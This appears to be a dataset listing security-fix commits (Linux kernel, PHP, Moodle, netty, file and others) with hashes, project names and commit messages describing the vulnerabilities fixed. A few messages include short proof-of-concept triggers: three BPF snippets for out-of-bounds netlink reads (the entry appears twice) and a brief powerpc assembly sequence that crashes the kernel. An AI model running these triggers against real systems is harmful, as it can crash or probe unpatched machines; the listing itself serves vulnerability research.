File(s) In Commit: 
    net/netfilter/nf_conntrack_proto_dccp.c
Blob(s) In Commit: 
    cb372f96f10dc3c2f60064e49b86d35c76c6cd1b
Blob(s) Before Fix: 
    24fdce256cb0a65ee9996dfa7fa2569e499eebd0
    2e664a69d7dbc4907d7c589b2a5addc6b48ef739
    38412684a8824463e99f9fc46111a7874013c1bb
    432f95780003f2e36a4d0fb08aaa10b900e052ff
    59359bec328acce9ee7d8ca247b61b26f48e537e
    6535326cf07c773ba9166c6cbba16b9e7f29fb75
    6dd995c7c72b4400cdbd23da703467690f2e8cb4
    8aa94ee457437b0ec4ebf3f9b69693cb5ff80082
    a45bee52dccc235f1d7a4f7caa11cfa2b8057531
    a46e6915a9cee806fc4ff6c488ce73fb8cbbe240
    a8ae287bc7afe00ec89ed8032f3cbd7ea1c54b7a
    a99b6c3427b0ce3e06458cb1fd37bc3bfac98723
    b553fdd68816b98a0f6f58cba3bd7363959479cf
    b68ce6ac13b35af50f8ad0d9545ec03150c24974
    ba65b2041eb4b7f747f7df605a049e7922b32a55
    c854e4a0ef45244be37afa4ef6873259797e098f
    d6dde6dc09e6679cf1206237d1456f1ecc2f21c0
    ef706a485be11d79f84df30b253af5b477542127
    fce1b1cca32d65c6241f0ee513db2fe5774a00b9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b22f5126a24b3b2f15448c3f2a254fc10cbc2b92:
netfilter: nf_conntrack_dccp: fix skb_header_pointer API usages\n\nSome occurences in the netfilter tree use skb_header_pointer() in the following way ...\n\n  struct dccp_hdr _dh, *dh    ...   skb_header_pointer(skb, dataoff, sizeof(_dh), &dh) \n\n... where dh itself is a pointer that is being passed as the copy buffer. Instead, we need to use &_dh as the forth argument so that we're copying the data into an actual buffer that sits on the stack.\n\nCurrently, we probably could overwrite memory on the stack (e.g. with a possibly mal-formed DCCP packet), but unintentionally, as we only want the buffer to be placed into _dh variable.\n\nFixes: 2bc780499aa3 ("[NETFILTER]: nf_conntrack: add DCCP protocol support") Signed-off-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>

======================================================================
Commit With Fix: 
    d11811baccf265ff567dddca03cac70b65838a4f
File(s) In Commit: 
    settings/site.ini.append.php
Blob(s) In Commit: 
    e7d1cec7e674b8075a0c1ed88276c92c00776a95
Blob(s) Before Fix: 
    10ef68e733c89feb2f115fa31aa246b443c98458
    55b44d44ecaa07ed55e5b406496a06bed366785b
Projects:
    myxt_bccie
Commit Message for d11811baccf265ff567dddca03cac70b65838a4f:
Updated: Commented out role policy override settings for greater default security of cie information

======================================================================
Commit With Fix: 
    d13682b7e27d14a6323c441426f3dde1cd86c751
File(s) In Commit: 
    www/make_subset.php
Blob(s) In Commit: 
    812cb5e77cbe9d86f796e05fec81a0232be7eca1
Blob(s) Before Fix: 
    377169b672669d9c7448a6b5ba459b0ac825e24f
    44a09cd692d1a28b9d53e376447b191df2854e34
Projects:
    1987santiago_php-font-lib
Commit Message for d13682b7e27d14a6323c441426f3dde1cd86c751:
Fix a possible XSS

======================================================================
Commit With Fix: 
    21f8aaee0c62708654988ce092838aa7df4d25d8
File(s) In Commit: 
    drivers/net/wireless/ath/ath9k/xmit.c
Blob(s) In Commit: 
    4f4ce83f7ab4afd69fb4ed4ae937953711d3343a
Blob(s) Before Fix: 
    0a75e2f68c9dc30043e32653d78f67799ab8b771
    c59ae43b9b35aeba9356f499a83f73ae02e96a8b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 21f8aaee0c62708654988ce092838aa7df4d25d8:
ath9k: protect tid->sched check\n\nWe check tid->sched without a lock taken on ath_tx_aggr_sleep(). That is race condition which can result of doing list_del(&tid->list) twice (second time with poisoned list node) and cause crash like shown below:\n\n[424271.637220] BUG: unable to handle kernel paging request at 00100104 [424271.637328] IP: [<f90fc072>] ath_tx_aggr_sleep+0x62/0xe0 [ath9k] ... [424271.639953] Call Trace: [424271.639998]  [<f90f6900>] ? ath9k_get_survey+0x110/0x110 [ath9k] [424271.640083]  [<f90f6942>] ath9k_sta_notify+0x42/0x50 [ath9k] [424271.640177]  [<f809cfef>] sta_ps_start+0x8f/0x1c0 [mac80211] [424271.640258]  [<c10f730e>] ? free_compound_page+0x2e/0x40 [424271.640346]  [<f809e915>] ieee80211_rx_handlers+0x9d5/0x2340 [mac80211] [424271.640437]  [<c112f048>] ? kmem_cache_free+0x1d8/0x1f0 [424271.640510]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640578]  [<c10fc23c>] ? put_page+0x2c/0x40 [424271.640640]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640706]  [<c1345a84>] ? kfree_skbmem+0x34/0x90 [424271.640787]  [<f809dde3>] ? ieee80211_rx_handlers_result+0x73/0x1d0 [mac80211] [424271.640897]  [<f80a07a0>] ieee80211_prepare_and_rx_handle+0x520/0xad0 [mac80211] [424271.641009]  [<f809e22d>] ? ieee80211_rx_handlers+0x2ed/0x2340 [mac80211] [424271.641104]  [<c13846ce>] ? ip_output+0x7e/0xd0 [424271.641182]  [<f80a1057>] ieee80211_rx+0x307/0x7c0 [mac80211] [424271.641266]  [<f90fa6ee>] ath_rx_tasklet+0x88e/0xf70 [ath9k] [424271.641358]  [<f80a0f2c>] ? ieee80211_rx+0x1dc/0x7c0 [mac80211] [424271.641445]  [<f90f82db>] ath9k_tasklet+0xcb/0x130 [ath9k]\n\nBug report: https://bugzilla.kernel.org/show_bug.cgi?id=70551\n\nReported-and-tested-by: Max Sydorenko <maxim.stargazer@gmail.com> Cc: stable@vger.kernel.org Signed-off-by: Stanislaw Gruszka <sgruszka@redhat.com> Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    621b5060e823301d0cba4cb52a7ee3491922d291
File(s) In Commit: 
    arch/powerpc/kernel/process.c
Blob(s) In Commit: 
    af064d28b36524c5ce9c8fc982a58eec65ebbfc7
Blob(s) Before Fix: 
    076d1242507a7fdcf32c374b66b3b005eb4e0db9
    16e77a81ab4f29d5090b3f65b600d738fe6ed9cf
    3386d8ab7eb0607b3c9d6f03e68824d4abe4bd88
    4a96556fd2d49e484c143ed3643db6c8a24962df
    59dd545fdde188761e140c2f6969b9b9e348662b
    6f428da53e2085b877334270286069e2ba54da37
    75c2d1009985eb8dbd9f3995fc900f9f21227d01
    8d4c247f17389f283d02bc48dba044ff077e3ffe
    8f53954e75a3872f2ca78415634a7b8430f569c5
    94178e55f49dabe08fe934762df578d170e50989
    96d2fdf3aa9ebe3bba547fd567c5a232be20ec9a
    a902723fdc69b0857d3d8658e32790614983c626
    c517dbe705fdd5fd5944ae693c04aaaf52510e85
    d817ab018486d71b8c06bb9b6275bd0f533d8c89
    ea2f6a3aee49bbe140f1c23c372ce235fbf2993e
    ea5a406681883337b555b942858dbf708600bbab
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 621b5060e823301d0cba4cb52a7ee3491922d291:
powerpc/tm: Fix crash when forking inside a transaction\n\nWhen we fork/clone we currently don't copy any of the TM state to the new thread.  This results in a TM bad thing (program check) when the new process is switched in as the kernel does a tmrechkpt with TEXASR FS not set.  Also, since R1 is from userspace, we trigger the bad kernel stack pointer detection.  So we end up with something like this:\n\n   Bad kernel stack pointer 0 at c0000000000404fc    cpu 0x2: Vector: 700 (Program Check) at [c00000003ffefd40]        pc: c0000000000404fc: restore_gprs+0xc0/0x148        lr: 0000000000000000        sp: 0       msr: 9000000100201030      current = 0xc000001dd1417c30      paca    = 0xc00000000fe00800   softe: 0        irq_happened: 0x01        pid   = 0, comm = swapper/2    WARNING: exception is not recoverable, can't continue\n\nThe below fixes this by flushing the TM state before we copy the task_struct to the clone.  To do this we go through the tmreclaim patch, which removes the checkpointed registers from the CPU and transitions the CPU out of TM suspend mode.  Hence we need to call tmrechkpt after to restore the checkpointed state and the TM mode for the current task.\n\nTo make this fail from userspace is simply: 	tbegin 	li	r0, 2 	sc 	<boom>\n\nKudos to Adhemerval Zanella Neto for finding this.\n\nSigned-off-by: Michael Neuling <mikey@neuling.org> cc: Adhemerval Zanella Neto <azanella@br.ibm.com> cc: stable@vger.kernel.org Signed-off-by: Benjamin Herrenschmidt <benh@kernel.crashing.org>

======================================================================
Commit With Fix: 
    a03ffcf873fe0f2565386ca8ef832144c42e67fa
File(s) In Commit: 
    arch/x86/net/bpf_jit_comp.c
Blob(s) In Commit: 
    7b65f752c5f8fd79af2c6b4afb342988bdd8d56c
Blob(s) Before Fix: 
    0597f95b6da663af5a43d5f5effd0bdf0447fe4f
    5a5b6e4dd7386586b5a9e8d5559b6b104f48d447
    7c1b765ecc59e3324299dfe34ba04d127fed4878
    bfab3fa10edc63e50b4184d00e75566678242a0d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a03ffcf873fe0f2565386ca8ef832144c42e67fa:
net: bpf_jit: fix an off-one bug in x86_64 cond jump target\n\nx86 jump instruction size is 2 or 5 bytes (near/long jump), not 2 or 6 bytes.\n\nIn case a conditional jump is followed by a long jump, conditional jump target is one byte past the start of target instruction.\n\nSigned-off-by: Markus Kötter <nepenthesdev@gmail.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    05ab8f2647e4221cbdb3856dd7d32bd5407316b3
File(s) In Commit: 
    net/core/filter.c
Blob(s) In Commit: 
    0e0856f5d708457b6de9a71df82ff2547f97c155
Blob(s) Before Fix: 
    cd58614660cf54e1431392c5045bbdc9478336e6
    e08b3822c72a8bb67eeb4e8c3f139aebdb7b9d5a
Projects:
    0-T-0_ps4-linux
Commit Message for 05ab8f2647e4221cbdb3856dd7d32bd5407316b3:
filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check for a minimal message length before testing the supplied offset to be within the bounds of the message. This allows the subtraction of the nla header to underflow and therefore -- as the data type is unsigned -- allowing far to big offset and length values for the search of the netlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is also wrong. It has the minuend and subtrahend mixed up, therefore calculates a huge length value, allowing to overrun the end of the message while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to a UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--  | ld	#0x87654321  | ldx	#42  | ld	#nla  | ret	a  `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--  | ld	#0x87654321  | ldx	#42  | ld	#nlan  | ret	a  `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--  |   (needs a fake netlink header at offset 0)  | ld	#0  | ldx	#42  | ld	#nlan  | ret	a  `---\n\nFix the first issue by ensuring the message length fulfills the minimal size constrains of a nla header. Fix the second bug by getting the math for the remainder calculation right.\n\nFixes: 4738c1db15 ("[SKFILTER]: Add SKF_ADF_NLATTR instruction") Fixes: d214c7537b ("filter: add SKF_AD_NLATTR_NEST to look for nested..") Cc: Patrick McHardy <kaber@trash.net> Cc: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    05ab8f2647e4221cbdb3856dd7d32bd5407316b3
File(s) In Commit: 
    net/core/filter.c
Blob(s) In Commit: 
    0e0856f5d708457b6de9a71df82ff2547f97c155
Blob(s) Before Fix: 
    cd58614660cf54e1431392c5045bbdc9478336e6
    e08b3822c72a8bb67eeb4e8c3f139aebdb7b9d5a
Projects:
    0-T-0_ps4-linux
Commit Message for 05ab8f2647e4221cbdb3856dd7d32bd5407316b3:
filter: prevent nla extensions to peek beyond the end of the message\n\nThe BPF_S_ANC_NLATTR and BPF_S_ANC_NLATTR_NEST extensions fail to check for a minimal message length before testing the supplied offset to be within the bounds of the message. This allows the subtraction of the nla header to underflow and therefore -- as the data type is unsigned -- allowing far to big offset and length values for the search of the netlink attribute.\n\nThe remainder calculation for the BPF_S_ANC_NLATTR_NEST extension is also wrong. It has the minuend and subtrahend mixed up, therefore calculates a huge length value, allowing to overrun the end of the message while looking for the netlink attribute.\n\nThe following three BPF snippets will trigger the bugs when attached to a UNIX datagram socket and parsing a message with length 1, 2 or 3.\n\n ,-[ PoC for missing size check in BPF_S_ANC_NLATTR ]--  | ld	#0x87654321  | ldx	#42  | ld	#nla  | ret	a  `---\n\n ,-[ PoC for the same bug in BPF_S_ANC_NLATTR_NEST ]--  | ld	#0x87654321  | ldx	#42  | ld	#nlan  | ret	a  `---\n\n ,-[ PoC for wrong remainder calculation in BPF_S_ANC_NLATTR_NEST ]--  |   (needs a fake netlink header at offset 0)  | ld	#0  | ldx	#42  | ld	#nlan  | ret	a  `---\n\nFix the first issue by ensuring the message length fulfills the minimal size constrains of a nla header. Fix the second bug by getting the math for the remainder calculation right.\n\nFixes: 4738c1db15 ("[SKFILTER]: Add SKF_ADF_NLATTR instruction") Fixes: d214c7537b ("filter: add SKF_AD_NLATTR_NEST to look for nested..") Cc: Patrick McHardy <kaber@trash.net> Cc: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Daniel Borkmann <dborkman@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    e9bedb644d106a043e33e1058bedd1c2c0b2e2e0
File(s) In Commit: 
    libahttp/err.C
Blob(s) In Commit: 
    b6101f027746ac6f6d252f58f5609138db56bd66
Blob(s) Before Fix: 
    2120ca5c8dbbfb12f8a32f921042b9ce7af2ca50
Projects:
    s4y_okws
Commit Message for e9bedb644d106a043e33e1058bedd1c2c0b2e2e0:
Escape error page content\n\nCredit to Kenneth F. Belva (https://twitter.com/infosecmaverick) https://hackerone.com/reports/3317

======================================================================
Commit With Fix: 
    e9c243a5a6de0be8e584c604d353412584b592f8
File(s) In Commit: 
    kernel/futex.c
Blob(s) In Commit: 
    663ea2b84a3830ec9c772f78ec7eaa23504bfcc5
Blob(s) Before Fix: 
    81dbe773ce4c20bdeafa8effa858cf85b995dfbe
    b504ac4384ee0798bebf5490c5c218230b43d819
Projects:
    0-T-0_ps4-linux
Commit Message for e9c243a5a6de0be8e584c604d353412584b592f8:
futex-prevent-requeue-pi-on-same-futex.patch futex: Forbid uaddr == uaddr2 in futex_requeue(..., requeue_pi=1)\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call.  If we attempt this, then dangling pointers may be left for rt_waiter resulting in an exploitable condition.\n\nThis change brings futex_requeue() in line with futex_wait_requeue_pi() which performs the same check as per commit 6f7b0a2a5c0f ("futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()")\n\n[ tglx: Compare the resulting keys as well, as uaddrs might be   	different depending on the mapping ]\n\nFixes CVE-2014-3153.\n\nReported-by: Pinkie Pie Signed-off-by: Will Drewry <wad@chromium.org> Signed-off-by: Kees Cook <keescook@chromium.org> Cc: stable@vger.kernel.org Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Reviewed-by: Darren Hart <dvhart@linux.intel.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    7658e8257183f062dc01f87969c140707c7e52cb
File(s) In Commit: 
    pppd/options.c
Blob(s) In Commit: 
    e9042d1f64e2b5bbf05c74a91587f049f011c2b8
Blob(s) Before Fix: 
    45fa742cd9ce9d095490ebc68fa199023f8da8cc
Projects:
    AICP_android_device_samsung_maguro
Commit Message for 7658e8257183f062dc01f87969c140707c7e52cb:
pppd: Eliminate potential integer overflow in option parsing\n\nWhen we are reading in a word from an options file, we maintain a count of the length we have seen so far in 'len', which is an int.  When len exceeds MAXWORDLEN - 1 (i.e. 1023) we cease storing characters in the buffer but we continue to increment len.  Since len is an int, it will wrap around to -2147483648 after it reaches 2147483647.  At that point our test of (len < MAXWORDLEN-1) will succeed and we will start writing characters to memory again.\n\nThis may enable an attacker to overwrite the heap and thereby corrupt security-relevant variables.  For this reason it has been assigned a CVE identifier, CVE-2014-3158.\n\nThis fixes the bug by ceasing to increment len once it reaches MAXWORDLEN.\n\nReported-by: Lee Campbell <leecam@google.com> Signed-off-by: Paul Mackerras <paulus@samba.org>

======================================================================
Commit With Fix: 
    c54def7bd64d7c0b6993336abcffb8444795bf38
File(s) In Commit: 
    drivers/hid/hid-magicmouse.c
Blob(s) In Commit: 
    29a74c1efcb85fa727536c4b72be844f9963cd70
Blob(s) Before Fix: 
    05643cf9ea198595bfcf6ea803e63ee483b67b57
    20b40ad2632503754685b84cc07d8787a4a44515
    25ddf3e3aec641fd4d883843e87e59bc0e3b0c51
    2ab71758e2e22940e0c53c1873a32a03152a9808
    3b43d1cfa9368609302de46a73658779199d446f
    40ac6654f1d19f5d1bf5b02dacfd4d7d5f98c14e
    5bc37343eb22b3de7f3cca6163c6f1fd9a10dd4b
    73647266daadc57ecd36a948e50ff6df80aeed21
    7cf3ffe4b7bc26f4eeda3f2167c1f88f6e46e29b
    7e2e6cc5cba086cda3ef26d4a434396d196b51f6
    811062c60b75cd69a53b3482a1c11d2f27800ce7
    8427463beebd5f06d9103ccf2cdf405ef16d52aa
    93ee7793f88a74e809b4f041cf0b1107c71bcf39
    991ba79cfc727ac2d675b43d1c779caa0b3bf740
    a3c5dad786a4109abd3e13e97aca522c7ae5114c
    a8ce44296cfddaf34a486a7c78edde4836cd3115
    b454c43861578602e33d066a655eb5205e969533
    c24f3dfd9367e94034c36065a3c6520c7d111193
    c717dbf16ec3a1db8824794678b1911704232461
    d6fa496d0ca25c17035233315ba9f5d5ebddc4fd
    d9c3dcca4a23ec8a4f8915cd288b2fee24118ebd
    ecc2cbf300cc39bc31e3ff5ad5979dff49822402
    f0fbd7bd239e389e11e21d55ef108b5e8066984d
    f7f113ba083eb43fb1073d189a4979f7d4d6d724
Projects:
    0-T-0_ps4-linux
Commit Message for c54def7bd64d7c0b6993336abcffb8444795bf38:
HID: magicmouse: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be arbitrarily large, therefore we better sanity-check it so that magicmouse_emit_touch() gets only valid values of raw_id.\n\nCc: stable@vger.kernel.org Reported-by: Steven Vittitoe <scvitti@google.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    ad3e14d7c5268c2e24477c6ef54bbdf88add5d36
File(s) In Commit: 
    drivers/hid/hid-logitech-dj.c
Blob(s) In Commit: 
    b7ba82960c7925c5d04eb898af55a95b3be058f4
Blob(s) Before Fix: 
    486dbde2ba2d90d3802e59163870b57c4274fb28
    5207591a598c05944a348be2252c4a346e0e5cfa
    a7947d8251a88af3ecb017a7e597556cd0c046ff
    ca0ab5112efd6e152b0f5d6a6fd044da0bd33089
    f45279c3b11a9f241f6b0f28d1565ef965c04587
Projects:
    0-T-0_ps4-linux
Commit Message for ad3e14d7c5268c2e24477c6ef54bbdf88add5d36:
HID: logitech: perform bounds checking on device_id early enough\n\ndevice_index is a char type and the size of paired_dj_deivces is 7 elements, therefore proper bounds checking has to be applied to device_index before it is used.\n\nWe are currently performing the bounds checking in logi_dj_recv_add_djhid_device(), which is too late, as malicious device could send REPORT_TYPE_NOTIF_DEVICE_UNPAIRED early enough and trigger the problem in one of the report forwarding functions called from logi_dj_raw_event().\n\nFix this by performing the check at the earliest possible ocasion in logi_dj_raw_event().\n\nCc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    51217e69697fba92a06e07e16f55c9a52d8e8945
File(s) In Commit: 
    drivers/hid/hid-logitech-dj.c
Blob(s) In Commit: 
    ca0ab5112efd6e152b0f5d6a6fd044da0bd33089
Blob(s) Before Fix: 
    486dbde2ba2d90d3802e59163870b57c4274fb28
Projects:
    0-T-0_ps4-linux
Commit Message for 51217e69697fba92a06e07e16f55c9a52d8e8945:
HID: logitech: fix bounds checking on LED report size\n\nThe check on report size for REPORT_TYPE_LEDS in logi_dj_ll_raw_request() is wrong  the current check doesn't make any sense -- the report allocated by HID core in hid_hw_raw_request() can be much larger than DJREPORT_SHORT_LENGTH, and currently logi_dj_ll_raw_request() doesn't handle this properly at all.\n\nFix the check by actually trimming down the report size properly if it is too large.\n\nCc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    6817ae225cd650fb1c3295d769298c38b1eba818
File(s) In Commit: 
    drivers/usb/serial/whiteheat.c
Blob(s) In Commit: 
    6c3734d2b45a7a9ca24557a586ba10135b7cadb3
Blob(s) Before Fix: 
    2750684c8795aac2731f3b942788f92671c832f3
    347caad47a121d3f7a26ec7f3246a6960114ffc2
    36a7740e827c997ebbc156bfcb6e908cb02d1804
    407e23c87946b8ad8e67afa6ec17b6a24a14b53f
    473635e7f5dbdf8bb4c28c20102f12b438b31d77
    55cebc1e6fec1d6a2664e2d796c49e2af728af75
    5b073bcc807b3a9557c07409cb81b457310fae98
    5e3dd9f87ff5bdd59044da0068ae8be84c6eac0e
    7e0acf5c8e38bde7345b3e459f11e352e91739ac
    ae2f161a19528fdb8328a9ec773915a668c114b8
    ae79c2245a7372d28bce2feb76c327bb5b38a38e
    b9fca3586d741003a50ffb435be7de74020c48e8
    bf7014d49a50ba2d6162b11ba1430ad4bca3acff
    cc5a430dc357cb276cd46dff9c7977b0d02f3a4b
    d3ea90bef84d98a67f110f6040ca70ec12b7a5fb
    e62f2dff8b7df6db65e684ef01dbbccced3a6066
Projects:
    0-T-0_ps4-linux
Commit Message for 6817ae225cd650fb1c3295d769298c38b1eba818:
USB: whiteheat: Added bounds checking for bulk command response\n\nThis patch fixes a potential security issue in the whiteheat USB driver which might allow a local attacker to cause kernel memory corrpution. This is due to an unchecked memcpy into a fixed size buffer (of 64 bytes). On EHCI and XHCI busses it's possible to craft responses greater than 64 bytes leading a buffer overflow.\n\nSigned-off-by: James Forshaw <forshaw@google.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    844817e47eef14141cf59b8d5ac08dd11c0a9189
File(s) In Commit: 
    drivers/hid/hid-picolcd_core.c
Blob(s) In Commit: 
    020df3c2e8b42717c62bbe0470aa47845535e4a5
Blob(s) Before Fix: 
    31cd93fc3d4bff26fb0275d102c90270483289e7
    85987ec50fa353341c188eb1c9e4a83c1049d492
    86df26e58abac65f671601b70f15085faa4fdece
    a0abd5c65807ec0fa7018135854f7168304deba8
    acbb021065ece8287c9d3ea433c860afc0711855
    b48092d0e1394a73f4c4ef66a21bc490f4b686f0
    bd206b2fb6c685df13aff2bd7226f866e58c8a39
    c1b29a9eb41ab824fd643e920b9a16f30af29186
    ef4a42be0415cfe0cea7fed4e7512cb7b0245f49
Projects:
    0-T-0_ps4-linux
Commit Message for 844817e47eef14141cf59b8d5ac08dd11c0a9189:
HID: picolcd: sanity check report size in raw_event() callback\n\nThe report passed to us from transport driver could potentially be arbitrarily large, therefore we better sanity-check it so that raw_data that we hold in picolcd_pending structure are always kept within proper bounds.\n\nCc: stable@vger.kernel.org Reported-by: Steven Vittitoe <scvitti@google.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>

======================================================================
Commit With Fix: 
    27a14bc7ba285a0a5ebfdb55e54001aa11932b08
File(s) In Commit: 
    src/softmagic.c
Blob(s) In Commit: 
    6d694192121d0651a46eb737926457a3b014fcab
Blob(s) Before Fix: 
    0c36cd84d83568d57f923aa2971dea63a7a48c13
    9ba500b738e88faa4168a84e5bbc02f1e8fe8aa2
Projects:
    5hadowblad3_file
Commit Message for 27a14bc7ba285a0a5ebfdb55e54001aa11932b08:
Correctly compute the truncated pascal string size (Francisco Alonso and Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    36fadd29849b8087af9f4586f89dbf74ea45be67
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    0bfb31a229af5fc05579593e3ea83568b88cf3bb
Blob(s) Before Fix: 
    375406c3789e8154b5eec38efd3c3ad7492ed342
    6652581c27b843379a3e47b5223be9e7c9485445
    c258e82f35def06e1d031222ec7bb2d9d2b16228
Projects:
    5hadowblad3_file
Commit Message for 36fadd29849b8087af9f4586f89dbf74ea45be67:
Use the proper sector size when checking stream offsets (Francisco Alonso and Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    40bade80cbe2af1d0b2cd0420cebd5d5905a2382
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    6652581c27b843379a3e47b5223be9e7c9485445
Blob(s) Before Fix: 
    375406c3789e8154b5eec38efd3c3ad7492ed342
Projects:
    5hadowblad3_file
Commit Message for 40bade80cbe2af1d0b2cd0420cebd5d5905a2382:
Fix incorrect bounds check for sector count. (Francisco Alonso and Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    93e063ee374b6a75729df9e7201fb511e47e259d
File(s) In Commit: 
    src/cdf.c
Blob(s) In Commit: 
    c258e82f35def06e1d031222ec7bb2d9d2b16228
Blob(s) Before Fix: 
    0bfb31a229af5fc05579593e3ea83568b88cf3bb
    2768de86ffbca79f2587e04f7c65df38cc2c3d55
Projects:
    5hadowblad3_file
Commit Message for 93e063ee374b6a75729df9e7201fb511e47e259d:
Add missing check offset test (Francisco Alonso, Jan Kaluza at RedHat)

======================================================================
Commit With Fix: 
    2fa9400a59d0563a66908aba55c41e7285a04994
File(s) In Commit: 
    src/main/java/org/jboss/netty/handler/ssl/SslHandler.java
Blob(s) In Commit: 
    c3bb18d4cb6f7324d3474800c05013ce16c67332
Blob(s) Before Fix: 
    477485926ac7a28485f35a52c48caccd860a9e80
    83dfeb999b63d64ac70b261c204f69ca44e5374a
Projects:
    007arsen_netty
Commit Message for 2fa9400a59d0563a66908aba55c41e7285a04994:
Fix a bug where SslHandler does not handle SSLv2Hello correctly\n\nMotivation:\n\nWhen a SSLv2Hello message is received, SSLEngine expects the application buffer size to be more than 30KB which is larger than what SslBufferPool can provide.  SSLEngine will always return with BUFFER_OVERFLOW status, blocking the SSL session from continuing the handshake.\n\nModifications:\n\nWhen SSLEngine.getSession().getApplicationBufferSize() returns a value larger than what SslBufferPool provides, allocate a temporary heap buffer.\n\nResult:\n\nSSLv2Hello is handled correctly.

======================================================================
Commit With Fix: 
    dab6cf55f81a6e16b8147aed9a843e1691dcd318
File(s) In Commit: 
    arch/s390/kernel/ptrace.c
Blob(s) In Commit: 
    5dc7ad9e2fbf2d1b035194b30db18a82957c1358
Blob(s) Before Fix: 
    02f300fbf070ac5abbfe667023237ca0a45f6fcf
    184d305af3e73f15c52ae8444a06ef94f8579ff1
    1c82619eb4f768343f8a9c20f8f30a00ba7370fd
    2d716734b5b1b2b482e580aee483d07b014c301f
    4ac8fafec95fa87d0b680c6222ac3c9e9f06700a
    8c390e7a525a20aadbd3158104805d111c5fdabb
    9556905bd3ce42c046052a54aa32ed5b07d9d559
    a314c57f4e94a5a91c162de68360556babd71f8a
    a48bc79a111f47c1a138c9db6606eaa8ec9f7fd8
    b76230b666129db3113b1689f0c65e918f6cfaba
    e65c91c591e8b99e4189f31b403a35ad06837f4f
    ef86ad2439868ffd4889b56f378f19e5c1f11968
    f6be6087a0e98edb3d2917228cb65b4657b61d11
Projects:
    0-T-0_ps4-linux
Commit Message for dab6cf55f81a6e16b8147aed9a843e1691dcd318:
s390/ptrace: fix PSW mask check\n\nThe PSW mask check of the PTRACE_POKEUSR_AREA command is incorrect. The PSW_MASK_USER define contains the PSW_MASK_ASC bits, the ptrace interface accepts all combinations for the address-space-control bits. To protect the kernel space the PSW mask check in ptrace needs to reject the address-space-control bit combination for home space.\n\nFixes CVE-2014-3534\n\nCc: stable@vger.kernel.org Signed-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>

======================================================================
Commit With Fix: 
    ce5a785b0962c3c94c7a7b0d36176482d21db95d
File(s) In Commit: 
    user/profile.php
Blob(s) In Commit: 
    291fc131f6fd5e087431fd68114d2d66b46f6e0a
Blob(s) Before Fix: 
    3ac9b7a24314e55ca7fa11e0db5e7d4611029c5b
    88fb9a78f3bb4ea18939ba010bbbbb3939f89204
    a5c317b5050e46b1531015028a7cda9cc1d7075c
    e30bc8d72bd0e8a1a3dd57263e7dd5c1db1ce4fe
Projects:
    007durgesh219_moodle
Commit Message for ce5a785b0962c3c94c7a7b0d36176482d21db95d:
MDL-45683 user: Escaping Skype ID used in profile

======================================================================
Commit With Fix: 
    2fefae47716d501aec41c1102f3fd4531f070b05
File(s) In Commit: 
    ext/standard/dns.c
Blob(s) In Commit: 
    0b5e69ca58cc13b9f4e7f78dbac0c89aa5fb5e26
Blob(s) Before Fix: 
    214a7dc7e92faf55a2f69be27adbb8ea99ab403f
    53483ff58b62edbdaef3f5f15aaf785925cd1164
    6a894467ff41122e30c9ac36ae5b530b59dbd43c
    a6739747057b2e6329ab9cd390e5d1628a4f18d4
    bdfb04ce3a8b8e3d06818878541b115e3c35592d
Projects:
    0014593_php-src
Commit Message for 2fefae47716d501aec41c1102f3fd4531f070b05:
Fixed Sec Bug #67717 segfault in dns_get_record CVE-2014-3597\n\nIncomplete fix for CVE-2014-4049\n\nCheck possible buffer overflow - pass real buffer end to dn_expand calls - check buffer len before each read

======================================================================
Commit With Fix: 
